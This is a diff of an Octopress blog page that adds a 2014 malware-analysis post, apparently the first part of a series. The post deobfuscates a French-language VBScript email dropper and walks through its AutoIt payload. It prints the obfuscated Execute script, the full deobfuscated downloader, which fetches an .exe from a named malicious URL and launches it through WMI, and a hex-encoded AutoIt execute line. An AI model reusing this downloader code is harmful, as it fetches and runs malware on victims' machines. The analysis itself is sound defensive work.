@@ -5,11 +5,12 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>My Octopress Blog</title>
-  <meta name="author" content="Your Name">
+  <title>sprintf(out, "%s%s%s", the->blog, of, josh());</title>
+  <meta name="author" content="Josh Max">
 
   
-  <meta name="description" content=" Blog Archives Recent Posts ">
+  <meta name="description" content="So, today a little bird told me I should create a weblog to store all of the little things I do.
+I&rsquo;m not quite sure how to blog, nor am I sure &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,10 +19,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://yoursite.com">
+  <link rel="canonical" href="http://joshumax.github.io">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <link href="/atom.xml" rel="alternate" title="sprintf(out, "%s%s%s", the->blog, of, josh());" type="application/atom+xml">
   <script src="/javascripts/modernizr-2.0.js"></script>
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
   <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
@@ -36,9 +37,9 @@
 
 <body   >
   <header role="banner"><hgroup>
-  <h1><a href="/">My Octopress Blog</a></h1>
+  <h1><a href="/">sprintf(out, "%s%s%s", the->blog, of, josh());</a></h1>
   
-    <h2>A blogging framework for hackers.</h2>
+    <h2>Your life has encountered a fatal error and had to be shut down.</h2>
   
 </hgroup>
 
@@ -50,7 +51,7 @@
   
 <form action="https://www.google.com/search" method="get">
   <fieldset role="search">
-    <input type="hidden" name="q" value="site:yoursite.com" />
+    <input type="hidden" name="q" value="site:joshumax.github.io" />
     <input class="search" type="text" name="q" results="0" placeholder="Search"/>
   </fieldset>
 </form>
@@ -66,6 +67,179 @@
       <div class="blog-index">
   
   
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/27/malware-fun-pt-1/">Malware Fun: Pt. 1</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-27T19:40:09-07:00" pubdate data-updated="true">May 27<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>So, today a little bird told me I should create a weblog to store all of the little things I do.
+I&rsquo;m not quite sure how to blog, nor am I sure it&rsquo;s the best thing for me&hellip; But, I thought I would
+give it a go.</p>
+
+<p>Today is Tuesday, which means for me it is malware day, and an interesting little e-mail &ldquo;virus&rdquo; showed up on malwr.com. The malware seems to be a tiny &ldquo;obfuscated&rdquo; VB script.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>WScript.Sleep(2000)
+</span><span class='line'>x=MsgBox("Vous devez disposer d'une autorisation pour pouvoir lire ce fichier !", 5+11, "Erreur l'ors de la lecture.")
+</span><span class='line'>WScript.Sleep(30000)
+</span><span class='line'>Execute(((chr((( 78638/959 ))) & chr((( -8024+8121 ))) & chr((( -8530+8640 ))) & chr((( -2812+2912 ))) & chr((( -2675+2786 ))) & chr((( 9524-9415 ))) & chr((( 416640/3968 ))) & chr((( 4125-4003 ))) & chr((( 82012/812 ))) & chr((( -5548+5561 ))) & chr((( 4541-4531 ))) & chr((( -6156+6266 ))) & chr((( 578023/5959 ))) & chr((( -4757+4866 ))) & chr((( -4978+5079 ))) & chr((( 187112/2462 ))) & chr((( -2956+3057 ))) & chr((( -681+791 ))) & chr((( 6873-6770 ))) & chr((( 3120-3004 ))) & chr((( -5737+5841 ))) & chr((( -6921+6953 ))) & chr((( 132248/2168 ))) & chr((( 30880/965 ))) & chr((( 95746/1954 ))) & chr((( -2076+2129 ))) & chr((( 254-241 ))) & chr((( 70720/7072 ))) & chr((( -7827+7941 ))) & chr((( 509056/5248 ))) & chr((( 1476-1366 ))) & chr((( 4809-4709 ))) & chr((( -4148+4259 ))) & chr((( 43164/396 ))) & chr((( 2436-2326 ))) & chr((( 5012-4915 ))) & chr((( 29103/267 ))) & chr((( -1718+1819 ))) ... (CUT FOR BREVETY) ... & vbcrlf )))</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s a small script, so at first I thought it might be one of those &ldquo;MSGBOX Ur Hackedz!&rdquo; scripts that 10-year-olds oh-so-love to create. But on the other hand, it could be something even more nefarious. Curiosity got the best of me, and I decided to take a look for myself&hellip;</p>
+
+<ul>
+<li>Step 1, examening what we know</li>
+</ul>
+
+
+<p>Well, whoever made this script seems to either be French, or intended it to be for a French user&hellip;
+&ldquo;Vous devez disposer d&#8217;une autorisation pour pouvoir lire ce fichier !&rdquo; roughly translates to:
+&ldquo;You must have permission to read this file!&rdquo; which is an obvious bit of social engineering (as a
+lot of malware tends to create fake errors, lulling the user into a sense of security).</p>
+
+<ul>
+<li>Step 2, reversing the &ldquo;obfuscation&rdquo;</li>
+</ul>
+
+
+<p>Okay, whoever designed this VBScript &ldquo;obfuscation&rdquo; needs to get an MRI to check and see what part of their brain is malfunctioning, out of all the obfuscation in the world this has got to be the worst, but it makes my life a lot easier. All the script does is Execute some characters uncleverly
+hidden as some simple math problems. A teensy bit of C magic and the obfuscation was defeated. <em>cue depressing fanfare</em></p>
+
+<p>Our new, deobfuscated VBScript:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Randomize
+</span><span class='line'>nameLength = 15
+</span><span class='line'>randomname = ""
+</span><span class='line'>Do While Len(randomname) &lt; nameLength
+</span><span class='line'>currRandCur = Int(Rnd * 255)
+</span><span class='line'>If currRandCur &gt;= Asc("a") And currRandCur &lt;= Asc("z") _
+</span><span class='line'>Or currRandCur &gt;= Asc("A") And currRandCur &lt;= Asc("Z") _
+</span><span class='line'>Or currRandCur &gt;= Asc("0") And currRandCur &lt;= Asc("9") Then
+</span><span class='line'>randomname = randomname & Chr(currRandCur)
+</span><span class='line'>End If
+</span><span class='line'>Loop
+</span><span class='line'>strSource = "http://facturedell.com/innovice/procexp.exe"
+</span><span class='line'>strDest = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & randomname & ".exe"
+</span><span class='line'>set HTTP = CreateObject("Microsoft.XMLHTTP")
+</span><span class='line'>HTTP.open "GET", strSource, False
+</span><span class='line'>HTTP.send
+</span><span class='line'>set Stream = createobject("adodb.stream")
+</span><span class='line'>Const adTypeBinary = 1
+</span><span class='line'>Const adSaveCreateNotExist = 1
+</span><span class='line'>Const adSaveCreateOverWrite = 2
+</span><span class='line'>Stream.type = adTypeBinary
+</span><span class='line'>Stream.open
+</span><span class='line'>Stream.write HTTP.responseBody
+</span><span class='line'>Stream.savetofile strDest, adSaveCreateOverWrite
+</span><span class='line'>set Stream = nothing
+</span><span class='line'>set HTTP = nothing
+</span><span class='line'> 
+</span><span class='line'>set objWMIService = getobject("winmgmts://./root/cimv2")
+</span><span class='line'>Set objProcess = objWMIService.Get("Win32_Process")
+</span><span class='line'>Set objProgram = objProcess.Methods_( _
+</span><span class='line'>"Create").InParameters.SpawnInstance_
+</span><span class='line'>objProgram.CommandLine = strDest
+</span><span class='line'>Set strShell = objWMIService.ExecMethod("Win32_Process", "Create", objProgram)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we&rsquo;re talking! Some horrific VBScript to aptly follow some horrific obfuscation. On the downside, the script is more dangerous than I thought at first. As you can see, the script creates an HTTP request to hXXP://facturedell.com/innovice/procexp.exe and saves it in %temp% under a random name. It then starts the process under whatever privilege the user currently has&hellip;</p>
+
+<ul>
+<li>Step 3, the REAL fun</li>
+</ul>
+
+
+<p>Well, now that we have a <em>real</em> binary to play with, let&rsquo;s have some fun! A quick signature check on VirusTotal shows that it&rsquo;s relatively clean (minus a few heuristic checks), so whatever the malware is it&rsquo;s either new or highly compressed and/or modified. Good thing I have my trusty copy of IDA Pro with me!</p>
+
+<p><img src="http://i61.tinypic.com/xpzvo8.png" alt="IDA 1" /></p>
+
+<p>Well, this looks oddly familiar&hellip; A quick view of the .strings table confirms that this is an AutoIT script. Oh boy, <em>another</em> AutoIT virus&hellip; Oddly, the default AutoIt decompiler worked on the script and I was able to get a dump of the (this time <em>actually</em> obfuscated) source.</p>
+
+<p>A dump of the source looks like miles and miles of useless veriable garbage. But what&rsquo;s that little function a quarter of the way down?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>EXECUTE(BINARYTOSTRING("0x537472696e674d69642846696c65526561642846696c654f70656e28404175746f49744578652c203029292c20537472696e67496e5374722846696c65526561642846696c654f70656e28404175746f49744578652c203029292c2022796f75616e647573666873616475696661662229202b20537472696e674c656e2822796f75616e64757366687361647569666166222929"))</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Fascinating! It looks like there is some runnable code in this code wasteland&hellip;but what on earth is BINARYTOSTRING. A quick google search shows the AutoIT documentation, which explains that it simply converts a hex-encoded binary string to a regular one. After dumping the contents of the snippet in bless, I recieved this:</p>
+
+<p><img src="http://i58.tinypic.com/15yb1cp.png" alt="Bless" /></p>
+
+<p>The script is strange enough itself, but the contents are even weirder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>youandusfhsaduifaf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It looks like it says &ldquo;you and us&rdquo; followd by a lot of mysterious garbage characters&hellip; Coincidence?</p>
+
+<p>I&rsquo;ll save the rest of my discoveries for part 2.</p>
+</div>
+  
+  
+
+
+    </article>
+  
   <div class="pagination">
     
     <a href="/blog/archives">Blog Archives</a>
@@ -77,6 +251,10 @@
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/05/27/malware-fun-pt-1/">Malware Fun: Pt. 1</a>
+      </li>
     
   </ul>
 </section>
@@ -91,7 +269,7 @@
     </div>
   </div>
   <footer role="contentinfo"><p>
-  Copyright &copy; 2014 - Your Name -
+  Copyright &copy; 2014 - Josh Max -
   <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
 </p>
 
